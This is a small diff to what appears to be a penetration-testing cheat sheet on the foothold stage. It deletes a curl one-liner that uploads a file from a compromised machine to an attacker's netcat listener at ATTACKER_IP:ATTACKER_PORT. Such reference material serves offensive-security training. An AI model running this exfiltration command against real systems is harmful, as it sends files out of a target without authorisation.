@@ -24,9 +24,6 @@ description: Foothold step – a note for confirming foothold and adding a littl
 ### CURL
 
 
- > 
- > **<font color=red>curl</font> \[ATTACKER_IP\]<font color=red>:</font>\[ATTACKER_PORT\]<font color=red> -F 'data=@</font>fmyFile<font color=red>'</font>**</br>
- > Send myFile to an netcat listener.
 
 # Upload File on Target
 
